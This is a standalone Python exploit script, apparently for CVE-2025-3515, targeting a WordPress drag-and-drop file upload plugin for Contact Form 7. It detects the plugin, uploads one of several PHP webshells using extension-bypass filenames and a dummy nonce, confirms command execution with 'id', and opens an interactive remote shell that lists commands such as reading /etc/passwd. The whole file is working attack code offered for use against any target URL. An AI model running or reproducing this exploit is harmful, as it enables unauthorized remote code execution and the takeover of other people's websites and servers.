#!/usr/bin/env python3

import requests
import time
import sys
import random
import string
import os
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CVE20253515Exploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        self.shell_url = None
        self.form_id = None
               
    def log(self, message, level="INFO"):
        timestamp = time.strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        print(f"[{timestamp}] {colors.get(level, '')}{level}{reset}: {message}")
        
    def check_target(self):
        self.log(f"Checking target accessibility: {self.target}")
        try:
            response = self.session.get(f"{self.target}/", timeout=5)
            self.log(f"Target accessible - Status: {response.status_code}", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"Target not accessible: {str(e)}", "ERROR")
            return False
            
    def detect_plugin(self):
        self.log("Detecting vulnerable plugin...")
        
        plugin_paths = [
            '/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/',
            '/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/inc/dnd-upload-cf7.php',
            '/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/assets/js/dnd-upload-cf7.js'
        ]
        
        for path in plugin_paths:
            try:
                response = self.session.get(f"{self.target}{path}")
                if response.status_code == 200:
                    self.log(f"Plugin detected: {path}", "SUCCESS")
                    return True
            except:
                continue
                
        try:
            response = self.session.get(f"{self.target}/")
            if 'drag-and-drop-multiple-file-upload-contact-form-7' in response.text:
                self.log("Plugin detected in page source", "SUCCESS")
                return True
        except:
            pass
            
        self.log("Plugin not detected", "WARNING")
        return False
        
    def find_contact_form(self):
        self.log("Searching for Contact Form 7 with file upload...")
        
        pages = ['/', '/contact/', '/contact-us/', '/submit/', '/support/']
        
        for page in pages:
            try:
                response = self.session.get(f"{self.target}{page}")
                
                if 'wpcf7' in response.text and ('mfile' in response.text or 'file' in response.text):
                    self.log(f"Contact form found on: {page}", "SUCCESS")
                    
                    import re
                    form_match = re.search(r'data-cf7-form-id="(\d+)"', response.text)
                    if form_match:
                        self.form_id = form_match.group(1)
                        self.log(f"Form ID: {self.form_id}", "SUCCESS")
                        
                    return True
                    
            except Exception as e:
                self.log(f"Error checking page {page}: {str(e)}", "ERROR")
                
        return False
        
    def generate_webshell(self):
        webshells = [
            "<?php if(isset($_GET['cmd'])){echo shell_exec($_GET['cmd']);} ?>",
            "<?php system($_GET['c']); ?>",
            "<?php eval($_POST['cmd']); ?>",
            "<?php if($_GET['x']){echo shell_exec($_GET['x']);} ?>"
        ]
        
        return random.choice(webshells)
        
    def upload_webshell(self):
        self.log("Attempting webshell upload...")
        
        shell_name = f"shell_{random.randint(1000, 9999)}"
        webshell_content = self.generate_webshell()
        
        extensions = ['.phar', '.php5', '.phtml', '.php.jpg', '.php.png']
        
        for ext in extensions:
            filename = f"{shell_name}{ext}"
            self.log(f"Trying upload with extension: {ext}")
            
            files = {
                'file': (filename, webshell_content, 'application/octet-stream')
            }
            
            upload_endpoints = [
                '/wp-admin/admin-ajax.php',
                '/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/inc/dnd-upload-cf7.php'
            ]
            
            for endpoint in upload_endpoints:
                try:
                    data = {
                        'action': 'dnd_codedropz_upload',
                        'type': 'click',
                        'security': 'dummy_nonce'
                    }
                    
                    if self.form_id:
                        data['form_id'] = self.form_id
                        
                    response = self.session.post(
                        f"{self.target}{endpoint}",
                        files=files,
                        data=data,
                        headers=self.headers
                    )
                    
                    self.log(f"Upload response: {response.status_code}")
                    
                    if response.status_code == 200:
                        upload_paths = [
                            f"/wp-content/uploads/drag-n-drop-cf7/{filename}",
                            f"/wp-content/uploads/{filename}",
                            f"/uploads/{filename}",
                            f"/{filename}"
                        ]
                        
                        for path in upload_paths:
                            shell_url = f"{self.target}{path}"
                            try:
                                test_response = self.session.get(f"{shell_url}?cmd=id")
                                if test_response.status_code == 200 and ("uid=" in test_response.text or "gid=" in test_response.text):
                                    self.log(f"Webshell uploaded successfully: {shell_url}", "SUCCESS")
                                    self.shell_url = shell_url
                                    return True
                            except:
                                continue
                                
                except Exception as e:
                    self.log(f"Upload error: {str(e)}", "ERROR")
                    
        return False
        
    def test_webshell(self):
        if not self.shell_url:
            return False
            
        self.log("Testing webshell functionality...")
        
        test_commands = ['id', 'whoami', 'pwd']
        
        for cmd in test_commands:
            try:
                response = self.session.get(f"{self.shell_url}?cmd={cmd}")
                if response.status_code == 200 and response.text.strip():
                    self.log(f"Command '{cmd}' output: {response.text.strip()}", "SUCCESS")
                    return True
            except:
                continue
                
        return False
        
    def interactive_shell(self):
        if not self.shell_url:
            self.log("No webshell available for interactive access", "ERROR")
            return
            
        self.log(f"Starting interactive shell: {self.shell_url}", "SUCCESS")
        self.log("Type 'exit' to quit, 'help' for commands")
        
        while True:
            try:
                cmd = input("\n\033[92mshell>\033[0m ").strip()
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                elif cmd.lower() == 'help':
                    print("""
Available commands:
- id                 : Show current user
- whoami            : Show username  
- uname -a          : Show system info
- ls -la            : List files
- pwd               : Show current directory
- cat /etc/passwd   : Show users
- ps aux            : Show processes
- netstat -tulpn    : Show network connections
- exit              : Quit shell
                    """)
                    continue
                elif not cmd:
                    continue
                    
                response = self.session.get(f"{self.shell_url}?cmd={cmd}")
                
                if response.status_code == 200:
                    output = response.text.strip()
                    if output:
                        print(output)
                    else:
                        print("(no output)")
                else:
                    print(f"Error: HTTP {response.status_code}")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except Exception as e:
                print(f"Error: {str(e)}")
                
    def exploit(self):
        
        if not self.check_target():
            return False
            
        if not self.detect_plugin():
            self.log("Vulnerable plugin not detected", "WARNING")
            
        if not self.find_contact_form():
            self.log("Contact form not found, trying direct upload", "WARNING")
            
        if not self.upload_webshell():
            self.log("Failed to upload webshell", "ERROR")
            return False
            
        if not self.test_webshell():
            self.log("Webshell not functional", "ERROR")
            return False
            
        self.log("Exploitation successful!", "SUCCESS")
        self.log(f"Webshell URL: {self.shell_url}", "SUCCESS")
        
        return True

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        print("Example: python3 exploit.py https://target.com")
        sys.exit(1)
        
    target = sys.argv[1]
    
    if not target.startswith(('http://', 'https://')):
        target = f"https://{target}"
        
    exploit = CVE20253515Exploit(target)
    
    if exploit.exploit():
        print("\n" + "="*60)
        print("[+] EXPLOITATION SUCCESSFUL!")
        print("="*60)
        
        choice = input("\nStart interactive shell? (y/n): ").lower()
        if choice in ['y', 'yes']:
            exploit.interactive_shell()
    else:
        print("\n" + "="*60)
        print("[-] EXPLOITATION FAILED")
        print("="*60)

if __name__ == "__main__":
    main()
